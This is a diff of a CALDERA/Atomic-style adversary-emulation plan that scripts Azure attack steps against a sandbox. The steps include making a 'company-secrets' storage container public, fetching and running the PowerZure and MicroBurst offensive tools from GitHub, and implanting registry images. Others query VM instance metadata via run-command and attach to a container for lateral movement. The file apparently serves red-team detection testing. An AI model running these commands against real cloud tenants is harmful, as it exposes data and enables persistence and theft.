@@ -1,4 +1,7 @@
 # aep1.yaml - CALDERA and Atomic style TTPs for Cloud Analytics project
+# prior to execution, user must run the following at Azure CLI to generate service principal for automated usage
+# az ad sp create-for-rbac # (or powershell equivalent)
+# install ms cli from: https://aka.ms/installazurecliwindows
 
 - emulation_plan_details:
     id: ffe6f601-5c08-401b-8f80-417a1be8bd97
@@ -7,26 +10,120 @@
     attack_version: 10.0
     format_version: 1.0
 
+- id: e44a39ce-0651-4ddd-8f05-f83aa2ffd657
+  name: Initial Access Login to Cloud
+  description: Authenticate service principal for automation
+  tactic: initial-access
+  technique:
+    attack_id: T1078.004
+    name: "Valid Accounts"
+  procedure_group: procedure_initial
+  procedure_step: "1.A"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) { ; }
+          else { Install-Module -Name Az -Force }; ;
+          $azAppId ="#{identity.app.id}";
+          $azTenantId= "#{identity.tenant}";
+          $azPass = ConvertTo-SecureString "#{identity.app.pw}" -AsPlainText -Force;
+          $cred = New-Object System.Management.Automation.PSCredential($azAppId , $azPass);
+          Connect-AzAccount -Credential $cred -TenantId $azTenantId  -ServicePrincipal;
+          $rgName = "casandbox";
+          $accountName = "importantshare";
+          $storageAccount = Get-AzStorageAccount -ResourceGroupName $rgName -Name $accountName;
+          $ctx = $storageAccount.Context;
+          $containerName = "company-secrets";
+          Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
+          Set-AzStorageContainerAcl -Container $containerName -Permission Container -Context $ctx;
+          Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
+
+  input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
+
+  executors:
+    - name: powershell
+      command: |
+        if (Get-InstalledModule -Name Az -ErrorAction SilentlyContinue) { ; }
+        else { Install-Module -Name Az -Force }; ;
+        $azAppId ="#{identity.app.id}";
+        $azTenantId= "#{identity.tenant}";
+        $azPass = ConvertTo-SecureString "#{identity.app.pw}" -AsPlainText -Force;
+        $cred = New-Object System.Management.Automation.PSCredential($azAppId , $azPass);
+        Connect-AzAccount -Credential $cred -TenantId $azTenantId  -ServicePrincipal;
+        $rgName = "casandbox";
+        $accountName = "importantshare";
+        $storageAccount = Get-AzStorageAccount -ResourceGroupName $rgName -Name $accountName;
+        $ctx = $storageAccount.Context;
+        $containerName = "company-secrets";
+        Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
+        Set-AzStorageContainerAcl -Container $containerName -Permission Container -Context $ctx;
+        Get-AzStorageContainerAcl -Container $containerName -Context $ctx;
+
 - id: e6a0bc92-f775-4797-9ea6-554e391c1eba
   name: Initial Access External Remote Services
   description: Create container in Azure
-  tactic: Initial
+  tactic: initial-access
   technique:
     attack_id: T1610
     name: "External Remote Services"
   cti_source: "https://attack.mitre.org/techniques/T1610/"
   procedure_group: procedure_initial
-  procedure_step: "1.A"
+  procedure_step: "1.B"
   platforms:
     windows:
-      cmd:
+      psh,pwsh:
         command: |
-          az container create -g 'ca-sandbox' --name psdocker --image mcr.microsoft.com/powershell:latest --cpu 1 --memory 1
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.upstream.image} --cpu 1 --memory 1;
+
+  input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
+    cloud.resource.group:
+      description: Name of resource group
+      type: string
+      default: casandbox
+    container.name:
+      description: Name of container
+      type: string
+      default: psdocker
+    container.registry:
+      description: Name of Azure Container Registry
+      type: string
+      default: justsomeregistry
+    container.upstream.image:
+      description: Upstream container to import
+      type: string
+      default: mcr.microsoft.com/powershell:latest
 
   executors:
-  - name: command_prompt
+  - name: powershell
     command: |
-      az container create -g 'ca-sandbox' --name psdocker --image mcr.microsoft.com/powershell:latest --cpu 1 --memory 1
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.upstream.image} --cpu 1 --memory 1
 
 - id: 8ae65b34-3427-4f64-ad75-490868ffc739
   name: Initial Access Valid Account
@@ -39,26 +136,24 @@
   procedure_step: "2.A"
   platforms:
     windows:
-      pwsh:
+      psh,pwsh:
         command: |
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          git clone https://github.com/hausec/PowerZure.git;
+          Import-Module .\Powerzure\PowerZure.psm1;
           Get-AzureUser -All
-  dependency_executor_name: powershell
-  dependencies:
-    - description: Install Powerzure
-      prereq_command: |
-        git clone https://github.com/hausec/PowerZure.git
-        ipmo .\PowerZure
-
   executors:
-  - name: command_prompt
+  - name: powershell
     command: |
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      git clone https://github.com/hausec/PowerZure.git;
+      Import-Module .\Powerzure\PowerZure.psm1;
       Get-AzureUser -All
-
 
 - id: e3ce8b20-c7dc-48f7-9412-f6a0d7159a9e
   name: Persistence
   description: Implant malicious container image into internal or external container registries
-  tactic: Persistence
+  tactic: persistence
   technique:
     attack_id: T1525
     name: "Implant Internal Image"
@@ -66,14 +161,54 @@
   procedure_step: "3.A"
   platforms:
     windows:
-      cmd:
+      psh,pwsh:
         command: |
-          az acr import -n justsomeregistry --source docker.io/library/hello-world:latest -t targetrepository:targettag
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          az acr import -n #{container.registry} --source #{container.upstream.image_b} -t #{container.registry}:#{container.upstream.image_b.tag}
+
+  input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
+    cloud.resource.group:
+      description: Name of resource group
+      type: string
+      default: casandbox
+    container.name:
+      description: Name of container
+      type: string
+      default: psdocker
+    container.registry:
+      description: Name of Azure Container Registry
+      type: string
+      default: justsomeregistry
+    container.upstream.image:
+      description: Upstream container to import
+      type: string
+      default: mcr.microsoft.com/powershell:latest
+    container.upstream.image_b:
+      description: Upstream container to import
+      type: string
+      default: docker.io/library/hello-world:latest
+    container.upstream.image_b.tag:
+      description: Tag name to use for container when imported
+      type: string
+      default: latest
 
   executors:
-  - name: command_prompt
+  - name: powershell
     command: |
-      az acr import -n justsomeregistry --source docker.io/library/hello-world:latest -t targetrepository:targettag
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      az acr import -n #{container.registry} --source #{container.upstream.image_b} -t #{container.registry}:#{container.upstream.image_b.tag};
 
 - id: 567c748d-e87a-4ebf-85c1-9a9cf1fd62f0
   name: Spawn container
@@ -86,21 +221,56 @@
   procedure_step: "4.A"
   platforms:
     windows:
-      cmd:
+      psh,pwsh:
         command: |
-          az container create -g 'ca-sandbox' --name psdocker --image justsomeregistry.aurecr.io/targetrepository:targettag --cpu 1 --memory 1
+          az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+          $rdm = Get-Random;
+          $ctrname = "test-ctr-"
+          $ctrname += $rdm
+          New-AzContainerInstanceObject -Name $ctrname -Image hello-world:latest -RequestCpu 1 -RequestMemoryInGb 1.5;
+          az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.image} --cpu 1 --memory 1;
+
+  input_arguments:
+    identity.app.id:
+      description: ID of Service principal generated for CLI usage
+      type: string
+      default: unknown
+    identity.app.pw:
+      description: Password returned by service principal creation
+      type: string
+      default: unknown
+    identity.tenant:
+      description: ID of tenant service principal is assigned to
+      type: string
+      default: unknown
+    cloud.resource.group:
+      description: Name of resource group
+      type: string
+      default: casandbox
+    cloud.location:
+      description: Azure location
+      type: string
+      default: eastus
+    container.name:
+      description: Name of container
+      type: string
+      default: psdocker
+    container.image:
+      description: Container image name and tag
+      type: string
+      default: "justsomeregistry.azurecr.io/targetrepository:targettag"
+    container.registry:
+      description: Name of Azure Container Registry
+      type: string
+      default: justsomeregistry
 
   executors:
-  - name: command_prompt
+  - name: powershell
     command: |
-      az container create -g 'ca-sandbox' --name psdocker --image justsomeregistry.aurecr.io/targetrepository:targettag --cpu 1 --memory 1
-
-  dependency_executor_name: acr_dependency
-  dependencies:
-    - description: Create ACR if necessary
-      prereq_command: |
-        az group create --name myrg --location eastus
-        az acr create --resource-group myrg --name justsomeregistry --sku Basic
+      az login --service-principal -u "#{identity.app.id}" -p="#{identity.app.pw}" --tenant "#{identity.tenant}";
+      az group create --name #{cloud.resource.group} --location #{cloud.location};
+      az acr create --resource-group #{cloud.resource.group} --name #{container.registry} --sku Basic;
+      az container create -g #{cloud.resource.group} --name #{container.name} --image #{container.image} --cpu 1 --memory 1;
 
 
 - id: fbbd13f9-d129-4737-aa75-70e1391be1d8
@@ -114,21 +284,24 @@
   procedure_step: "5.A"
   platforms:
     windows:
-      cmd:
+      psh,pwsh:
         command: |
-          Invoke-AzureRunCommand -VMName ca-linux-vm -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
+          git clone https://github.com/hausec/PowerZure.git;
+          Import-Module .\Powerzure\PowerZure.psm1;
+          Invoke-AzureRunCommand -VMName #{vm.name} -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
+
+  input_arguments:
+    vm.name:
+      description: The name of the Linux VM
+      type: string
+      default: ca-linux-vm
 
   executors:
-    - name: command_prompt
+    - name: powershell
       command: |
-        Invoke-AzureRunCommand -VMName ca-linux-vm -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
-
-  dependency_executor_name: powershell
-  dependencies:
-    - description: Install Powerzure
-      prereq_command: |
-        git clone https://github.com/hausec/PowerZure.git
-        ipmo .\PowerZure
+        git clone https://github.com/hausec/PowerZure.git;
+        Import-Module .\Powerzure\PowerZure.psm1;
+        Invoke-AzureRunCommand -VMName #{vm.name} -Command 'curl -H Metadata:true --noproxy "*" "http://169.254.169.254/metadata/instance?api-version=2020-09-01"'
 
 - id: e28963a8-8b91-4b57-a554-2b72fc467f75
   name: Discovery Groups
@@ -141,22 +314,18 @@
   procedure_step: "6.A"
   platforms:
     windows:
-      cmd:
+      psh,pwsh:
         command: |
-          Get-AzDomainInfo -folder MicroBurst -Verbose
+          git clone https://github.com/NetSPI/MicroBurst.git;
+          Import-Module .\MicroBurst\MicroBurst.psm1;
+          Get-AzDomainInfo -folder MicroBurst -Verbose;
 
   executors:
-    - name: command_prompt
+    - name: powershell
       command: |
-        Get-AzDomainInfo -folder MicroBurst -Verbose
-
-  dependency_executor_name: powershell
-  dependencies:
-    - description: Install Microburst
-      prereq_command: |
-        git clone https://github.com/NetSPI/MicroBurst.git
-        Import-Module .\MicroBurst.psm1
-
+        git clone https://github.com/NetSPI/MicroBurst.git;
+        Import-Module .\MicroBurst\MicroBurst.psm1;
+        Get-AzDomainInfo -folder MicroBurst -Verbose;
 
 - id: bbb0c079-2a95-475c-9509-e23fcc6131b4
   name: Discovery Container and Resources
@@ -171,20 +340,28 @@
     windows:
       cmd:
         command: |
-          Get-AzACR -username "justsomeregistry" -password "xxxxxx" -registry "http://justsomeregistry.azurecr.io"
+          Import-Module .\MicroBurst\MicroBurst.psm1;
+          Get-AzACR -username "#{acr.username}" -password "#{acr.password}" -registry "http://#{container.registry}.azurecr.io";
+
+  input_arguments:
+    acr.username:
+      description: Azure Container Registry username
+      type: string
+      default: justsomeregistry
+    acr.password:
+      description: Azure Container Registry password
+      type: string
+      default: secretpassword
+    container.registry:
+      description: Name of Azure Container Registry
+      type: string
+      default: justsomeregistry
 
   executors:
-    - name: command_prompt
+    - name: powershell
       command: |
-        Get-AzACR -username "justsomeregistry" -password "xxxxxx" -registry "http://justsomeregistry.azurecr.io"
-
-  dependency_executor_name: powershell
-  dependencies:
-    - description: Install Microburst
-      prereq_command: |
-        git clone https://github.com/NetSPI/MicroBurst.git
-        Import-Module .\MicroBurst.psm1
-
+        Import-Module .\MicroBurst\MicroBurst.psm1;
+        Get-AzACR -username "#{acr.username}" -password "#{acr.password}" -registry "http://#{container.registry}.azurecr.io";
 
 - id: aa2c4311-5ee2-447e-952e-2c2a6bfb9d6c
   name: Lateral Movement
@@ -199,9 +376,23 @@
     windows:
       cmd:
         command: |
-          az container attach --name publicapp --resource-group ca-sandbox
+          az container attach --name publicapp --resource-group #{cloud.resource.group};
+
+  input_arguments:
+    cloud.resource.group:
+      description: Name of resource group
+      type: string
+      default: casandbox
+    cloud.location:
+      description: Azure location
+      type: string
+      default: eastus
+    container.name_b:
+      description: Container to attach to
+      type: string
+      default: publicapp
 
   executors:
     - name: command_prompt
       command: |
-        az container attach --name publicapp --resource-group ca-sandbox
+        az container attach --name publicapp --resource-group #{cloud.resource.group};
